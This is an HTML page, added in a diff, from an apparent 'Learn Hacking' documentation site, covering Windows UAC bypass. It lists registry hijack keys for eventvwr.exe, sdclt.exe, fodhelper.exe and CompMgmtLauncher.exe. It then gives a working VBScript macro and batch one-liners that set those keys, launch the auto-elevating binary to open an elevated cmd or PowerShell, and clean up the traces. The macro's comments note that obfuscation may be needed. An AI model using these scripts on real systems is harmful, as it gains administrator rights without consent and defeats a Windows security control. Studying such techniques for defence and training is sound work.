@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en" dir=>
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="UAC Bypass #  Vulnerable programs #  CompMgmtLauncher.exe #  eventvwr.exe #   Windows 7/8/10 HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command = &quot;cmd.exe&quot;  sdclt.exe #   Windows 10 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe = &quot;cmd.exe&quot;  fodhelper.exe #   Windows 10 HKCU\Software\Classes\ms-settings\shell\open\command = &quot;DelegateExecute&quot; HKCU\Software\Classes\ms-settings\shell\open\command = &quot;cmd.exe&quot;  Examples #  WScript Example &#39; Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506 &#39; Sleep is caught (may use ping instead?) &#39; Obfusc may be needed Private Declare Sub Sleep Lib &quot;kernel32&quot; (ByVal dwMilliseconds As Long) Private Sub CommandButton1_Click() Set WSobj = CreateObject(&quot;WScript.">
+<meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="UAC Bypass" />
+<meta property="og:description" content="UAC Bypass #  Vulnerable programs #  CompMgmtLauncher.exe #  eventvwr.exe #   Windows 7/8/10 HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command = &quot;cmd.exe&quot;  sdclt.exe #   Windows 10 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe = &quot;cmd.exe&quot;  fodhelper.exe #   Windows 10 HKCU\Software\Classes\ms-settings\shell\open\command = &quot;DelegateExecute&quot; HKCU\Software\Classes\ms-settings\shell\open\command = &quot;cmd.exe&quot;  Examples #  WScript Example &#39; Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506 &#39; Sleep is caught (may use ping instead?) &#39; Obfusc may be needed Private Declare Sub Sleep Lib &quot;kernel32&quot; (ByVal dwMilliseconds As Long) Private Sub CommandButton1_Click() Set WSobj = CreateObject(&quot;WScript." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://brimstone.github.io/learn-hacking/docs/windows/privilege-escalation/uac/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2021-08-12T15:59:05-04:00" />
+
+<title>UAC Bypass | Learn Hacking</title>
+<link rel="manifest" href="../../../../manifest.json">
+<link rel="icon" href="../../../../favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="../../../../book.min.601a93ba058c3e9d2332392f9a4cef5a1a269e08edd2b44f6885e02ddf096460.css" integrity="sha256-YBqTugWMPp0jMjkvmkzvWhomngjt0rRPaIXgLd8JZGA=">
+<script defer src="../../../../en.search.min.fe51eb942afdefba50d8e6dade9adede5b9041df5c17b5476c09dff69d9cb4f7.js" integrity="sha256-/lHrlCr977pQ2Oba3pre3luQQd9cF7VHbAnf9p2ctPc="></script>
+
+<script defer src="../../../../sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk="></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+  
+</head>
+
+<body dir=>
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="../../../../"><span>Learn Hacking</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/lab/" class="">Lab</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/lab/users/" class="">Users</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/lab/machines/" class="">Machines</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/lab/machines/dc1/" class="">DC1</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/recon/" class="">Recon</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/recon/tools/" class="">Tools</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/web/" class="">Web</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <span>Tools</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <span>Vulnerabilies</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/linux/" class="">Linux</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/windows/" class="">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/fundamentals/" class="">Fundamentals</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/fundamentals/logonsessions-tokens/" class="">Logon Sessions and Access Tokens</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/privilege-escalation/" class="">Privilege Escalation</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/privilege-escalation/uac/" class="active">UAC Bypass</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/evasion/" class="">Evasion</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/evasion/amsi/" class="">AMSI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/evasion/unhooking/" class="">Unhooking EDR DLLs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="https://github.com/brimstone/learn-hacking" target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="../../../../svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>UAC Bypass</strong>
+
+  <label for="toc-control">
+    
+    <img src="../../../../svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#uac-bypass">UAC Bypass</a>
+      <ul>
+        <li><a href="#vulnerable-programs">Vulnerable programs</a>
+          <ul>
+            <li><a href="#compmgmtlauncherexe"><code>CompMgmtLauncher.exe</code></a></li>
+            <li><a href="#eventvwrexe"><code>eventvwr.exe</code></a></li>
+            <li><a href="#sdcltexe"><code>sdclt.exe</code></a></li>
+            <li><a href="#fodhelperexe"><code>fodhelper.exe</code></a></li>
+          </ul>
+        </li>
+        <li><a href="#examples">Examples</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="uac-bypass">
+  UAC Bypass
+  <a class="anchor" href="#uac-bypass">#</a>
+</h1>
+<h2 id="vulnerable-programs">
+  Vulnerable programs
+  <a class="anchor" href="#vulnerable-programs">#</a>
+</h2>
+<h3 id="compmgmtlauncherexe">
+  <code>CompMgmtLauncher.exe</code>
+  <a class="anchor" href="#compmgmtlauncherexe">#</a>
+</h3>
+<h3 id="eventvwrexe">
+  <code>eventvwr.exe</code>
+  <a class="anchor" href="#eventvwrexe">#</a>
+</h3>
+<ul>
+<li>Windows 7/8/10</li>
+<li><code>HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command</code> = <code>&quot;cmd.exe&quot;</code></li>
+</ul>
+<h3 id="sdcltexe">
+  <code>sdclt.exe</code>
+  <a class="anchor" href="#sdcltexe">#</a>
+</h3>
+<ul>
+<li>Windows 10</li>
+<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> = <code>&quot;cmd.exe&quot;</code></li>
+</ul>
+<h3 id="fodhelperexe">
+  <code>fodhelper.exe</code>
+  <a class="anchor" href="#fodhelperexe">#</a>
+</h3>
+<ul>
+<li>Windows 10</li>
+<li><code>HKCU\Software\Classes\ms-settings\shell\open\command</code> = <code>&quot;DelegateExecute&quot;</code></li>
+<li><code>HKCU\Software\Classes\ms-settings\shell\open\command</code> = <code>&quot;cmd.exe&quot;</code></li>
+</ul>
+<h2 id="examples">
+  Examples
+  <a class="anchor" href="#examples">#</a>
+</h2>
+<details >
+  <summary>WScript Example</summary>
+  <div class="markdown-inner">
+    <pre><code class="language-wscript" data-lang="wscript">' Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506
+' Sleep is caught (may use ping instead?)
+' Obfusc may be needed
+Private Declare Sub Sleep Lib &quot;kernel32&quot; (ByVal dwMilliseconds As Long)
+Private Sub CommandButton1_Click()
+   Set WSobj = CreateObject(&quot;WScript.Shell&quot;)
+   WSobj.RegWrite &quot;HKCU\Software\Classes\mscfile\shell\open\command\&quot;, &quot;&quot;
+   WSobj.RegWrite &quot;HKCU\Software\Classes\mscfile\shell\open\command\&quot;, &quot;C:\windows\system32\cmd.exe&quot;, &quot;REG_SZ&quot;
+   WSobj.Run (&quot;C:\Windows\System32\eventvwr.exe&quot;)
+   Sleep 2000
+   WSobj.RegDelete &quot;HKCU\Software\Classes\mscfile\shell\open\command\&quot;
+   WSobj.RegDelete &quot;HKCU\Software\Classes\mscfile\shell\open\&quot;
+   WSobj.RegDelete &quot;HKCU\Software\Classes\mscfile\shell\&quot;
+   WSobj.RegDelete &quot;HKCU\Software\Classes\mscfile\&quot;
+End Sub
+
+</code></pre><p><i>Source: <a href="../../../../examples/windows/privilege-escalation/uac-bypass.vbs">uac-bypass.vbs</a></i></p>
+
+  </div>
+</details>
+
+<details >
+  <summary>Batch Example</summary>
+  <div class="markdown-inner">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch"><span style="color:#75715e">REM Credits to https://gist.github.com/xillwillx/39e5cccc846d5b5a475bbad48216a5a7</span>
+
+**UAC bypass for Win10:**
+reg add <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&#34;</span> /d <span style="color:#e6db74">&#34;cmd.exe&#34;</span> /f &amp;&amp; <span style="color:#66d9ef">START</span> /W sdclt.exe &amp;&amp; reg delete <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&#34;</span> /f
+
+**UAC bypass for Win10:**
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /v <span style="color:#e6db74">&#34;DelegateExecute&#34;</span> /f &amp;&amp; reg add HKCU\Software\Classes\ms-settings\shell\open\command /d <span style="color:#e6db74">&#34;cmd /c start powershell.exe&#34;</span> /f &amp;&amp; <span style="color:#66d9ef">START</span> /W fodhelper.exe &amp;&amp; reg delete HKCU\Software\Classes\ms-settings /f
+
+**UAC bypass for 7/8/10:**
+reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d <span style="color:#e6db74">&#34;cmd.exe&#34;</span> /f &amp;&amp; <span style="color:#66d9ef">START</span> /W CompMgmtLauncher.exe &amp;&amp; reg delete HKEY_CURRENT_USER\Software\Classes\mscfile /f
+
+</code></pre></div><p><i>Source: <a href="../../../../examples/windows/privilege-escalation/uac-bypass.bat">uac-bypass.bat</a></i></p>
+
+  </div>
+</details>
+
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+  <div><a class="flex align-center" href="https://github.com/brimstone/learn-hacking/commit/26553ff1503bd80665febff16d6352d260c9d0a6" title='Last modified by Matt Robinson | August 12, 2021' target="_blank" rel="noopener">
+      <img src="../../../../svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 12, 2021</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/brimstone/learn-hacking/edit/trunk/content/docs/windows/privilege-escalation/uac.md" target="_blank" rel="noopener">
+      <img src="../../../../svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#uac-bypass">UAC Bypass</a>
+      <ul>
+        <li><a href="#vulnerable-programs">Vulnerable programs</a>
+          <ul>
+            <li><a href="#compmgmtlauncherexe"><code>CompMgmtLauncher.exe</code></a></li>
+            <li><a href="#eventvwrexe"><code>eventvwr.exe</code></a></li>
+            <li><a href="#sdcltexe"><code>sdclt.exe</code></a></li>
+            <li><a href="#fodhelperexe"><code>fodhelper.exe</code></a></li>
+          </ul>
+        </li>
+        <li><a href="#examples">Examples</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+ 
+    </aside>
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
